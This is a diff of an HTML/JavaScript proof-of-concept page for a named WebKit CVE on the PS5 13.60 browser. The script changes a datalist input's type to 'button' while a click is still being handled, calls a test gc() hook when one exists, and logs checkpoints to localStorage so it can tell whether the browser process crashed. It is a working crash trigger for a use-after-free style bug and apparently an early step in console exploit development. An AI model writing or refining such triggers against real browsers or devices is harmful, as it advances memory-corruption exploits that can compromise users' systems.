@@ -1,108 +1,124 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PS5 13.60 - CVE-2026-64783 Probe</title>
+<title>PS5 13.60 - V36.1 CVE-2026-64783</title>
 
 <style>
 body {
-    background:#111;
+    background:#101010;
     color:#eee;
     font:18px monospace;
-    padding:20px;
+    padding:24px;
 }
-input, button {
-    font:18px monospace;
-    padding:10px;
-    margin:8px 0;
+input {
+    width:420px;
+    font:24px sans-serif;
+    padding:14px;
 }
 #log {
+    margin-top:25px;
     white-space:pre-wrap;
-    margin-top:20px;
 }
 </style>
 
-<h2>PS5 13.60 — V36</h2>
+<h2>PS5 13.60 — V36.1</h2>
 <p>CVE-2026-64783 / WebKit bug 313521</p>
-<p>Datalist button lifetime probe</p>
 
-<input
-    id="target"
-    type="text"
-    list="values"
-    placeholder="Open datalist">
+<p>
+Click the <b>datalist/dropdown indicator</b>
+inside the input below.
+</p>
+
+<input id="target"
+       type="text"
+       list="values"
+       placeholder="CLICK DROPDOWN INDICATOR">
 
 <datalist id="values">
     <option value="TEST-A">
     <option value="TEST-B">
 </datalist>
 
-<br>
-
-<button id="arm">ARM TEST</button>
-
-<pre id="log">READY</pre>
+<pre id="log">STATUS: READY</pre>
 
 <script>
 "use strict";
 
-const input = document.querySelector("#target");
-const log = document.querySelector("#log");
-const arm = document.querySelector("#arm");
+const input = document.getElementById("target");
+const log = document.getElementById("log");
 
-let armed = false;
-let changed = false;
+let fired = false;
 
-function write(s) {
+function add(s) {
     log.textContent += "\n" + s;
+
+    try {
+        localStorage.setItem("V361_LAST", s);
+    } catch(e) {}
 }
 
-arm.onclick = function () {
+/*
+ * Show the final checkpoint from a previous load.
+ * Useful if WebContent dies and the browser reloads.
+ */
+try {
+    const previous = localStorage.getItem("V361_LAST");
 
-    if (armed)
+    if (previous)
+        add("PREVIOUS LAST CHECKPOINT: " + previous);
+} catch(e) {}
+
+add("DATALIST PRESENT");
+add("INPUT TYPE: " + input.type);
+add("WAITING FOR GENUINE DATALIST CLICK");
+
+input.addEventListener("click", function(event) {
+
+    if (fired)
         return;
 
-    armed = true;
+    fired = true;
 
-    arm.disabled = true;
+    add("CLICK ENTERED");
 
-    log.textContent =
-        "V36 ARMED\n" +
-        "input.type before = " +
-        input.type + "\n\n" +
-        "Now activate the datalist button/indicator.";
+    add("TYPE CHANGE START");
+
+    input.type = "button";
+
+    add("TYPE CHANGED: " + input.type);
 
     /*
-     * Capture click events associated with the input.
+     * The upstream LayoutTest calls gc() here.
      *
-     * The important lifetime transition is changing
-     * the owning input's type while click dispatch
-     * is still in progress.
+     * Ordinary webpages don't expose WebKit's
+     * testing-only gc() function, so deliberately
+     * don't fake it.
      */
+    if (typeof gc === "function") {
+        add("GC AVAILABLE");
+        gc();
+        add("GC RETURNED");
+    } else {
+        add("GC TEST API UNAVAILABLE");
+    }
 
-    input.addEventListener("click", function () {
+    add("CLICK LISTENER RETURNING");
 
-        write("CLICK_ENTER");
+}, { once:true });
 
-        if (!changed) {
+/*
+ * This runs only if execution survives the native
+ * event/default-handler processing.
+ */
+setInterval(function() {
 
-            changed = true;
+    if (!fired)
+        return;
 
-            write(
-                "BEFORE_TYPE_CHANGE: " +
-                input.type
-            );
+    if (input.type === "button") {
+        add("PAGE SURVIVED NATIVE EVENT HANDLING");
 
-            input.type = "button";
+        fired = false;
+    }
 
-            write(
-                "AFTER_TYPE_CHANGE: " +
-                input.type
-            );
-        }
-
-        write("CLICK_EXIT");
-
-    }, true);
-
-    write("TEST ARMED");
-};
+}, 1000);
 </script>
